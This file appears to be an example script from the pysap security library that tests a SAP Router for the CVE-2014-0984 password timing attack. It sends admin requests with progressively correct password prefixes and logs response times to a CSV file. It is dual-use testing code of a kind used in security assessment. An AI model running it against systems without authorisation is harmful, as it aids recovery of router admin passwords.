#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2015 by Martin Gallo, Core Security
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

# Standard imports
import logging
from optparse import OptionParser, OptionGroup
# External imports
from scapy.config import conf
from scapy.packet import bind_layers
# Custom imports
import pysap
from pysap.SAPNI import SAPNI, SAPNIStreamSocket
from pysap.SAPRouter import SAPRouter, get_router_version

# Try to import fau-timer for failing gracefully if not found
try:
    import fau_timer
    has_fau_timer = True
except ImportError:
    has_fau_timer = False


# Bind the SAPRouter layer
bind_layers(SAPNI, SAPRouter, )

# Set the verbosity to 0
conf.verb = 0


# Command line options parser
def parse_options():

    description = \
    """This example script connects with a SAP Router service and makes an
    information request using a provided password. It then records the
    time the remote service takes to respond to the request. Further analysis
    of the time records could be performed in order to identify whether the
    server is vulnerable to a timing attack on the password check (CVE-2014-0984).
    More details about the vulnerability in http://www.coresecurity.com/advisories/sap-router-password-timing-attack.

    The script make use of the fau_timer library for measuring the timing of
    server's responses. Install the library from https://github.com/martingalloar/mona-timing-lib.
    """

    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                         "url": pysap.__url__,
                                                         "repo": pysap.__repo__}

    usage = "Usage: %prog [options] -d <remote host>"

    parser = OptionParser(usage=usage, description=description, epilog=epilog)

    target = OptionGroup(parser, "Target")
    target.add_option("-d", "--remote-host", dest="remote_host", help="Remote host [%default]", default="127.0.0.1")
    target.add_option("-p", "--remote-port", dest="remote_port", type="int", help="Remote port [%default]", default=3299)
    target.add_option("--router-version", dest="router_version", type="int", help="SAP Router version to use [retrieve from the remote SAP Router]")
    parser.add_option_group(target)

    misc = OptionGroup(parser, "Misc options")
    misc.add_option("-t", "--tries", dest="tries", default=10, type="int", help="Amount of tries to make for each length [%default]")
    misc.add_option("--password", dest="password", default="password", help="Correct password to test")
    misc.add_option("-o", "--output", dest="output", default="output.csv", help="Output file [%default]")
    misc.add_option("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output [%default]")
    parser.add_option_group(misc)

    (options, _) = parser.parse_args()

    if not options.remote_host:
        parser.error("Remote host is required")

    return options


def try_password(options, password, output=None, k=0):

    p = SAPRouter(type=SAPRouter.SAPROUTER_ADMIN, version=options.router_version)
    p.adm_command = 2
    p.adm_password = password
    p = str(SAPNI() / p)

    fau_timer.init()
    fau_timer.send_request(options.remote_host, options.remote_port, p, len(p))
    fau_timer.calculate_time()
    cpuSpeed = fau_timer.get_speed()
    cpuTicks = fau_timer.get_cpu_ticks()
    time = fau_timer.get_time()

    if options.verbose:
        print("Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s nanosec" % (cpuSpeed, cpuTicks, time))

    # Write the time to the output file
    if output:
        output.write("%i,%s,%s\n" % (k, password, time))

    return time


# Main function
def main():
    options = parse_options()

    if not has_fau_timer:
        print ("[-] Required library not found. Please install it from https://github.com/seecurity/mona-timing-lib")
        return

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    # Initiate the connection
    conn = SAPNIStreamSocket.get_nisocket(options.remote_host, options.remote_port)
    print("[*] Connected to the SAP Router %s:%d" % (options.remote_host, options.remote_port))

    # Retrieve the router version used by the server if not specified
    if options.router_version is None:
        options.router_version = get_router_version(conn)

    print("[*] Using SAP Router version %d" % options.router_version)

    print("[*] Checking if the server is vulnerable to a timing attack (CVE-2014-0984) ...")

    with open(options.output, "w") as f:

        c = 0
        for i in range(0, len(options.password) + 1):
            password = options.password[:i] + "X" * (len(options.password) - i)
            print("[*] Trying with password (%s) len %d" % (password, len(password)))
            for _ in range(0, options.tries):
                try_password(options, password, f, c)
                c += 1


if __name__ == "__main__":
    main()
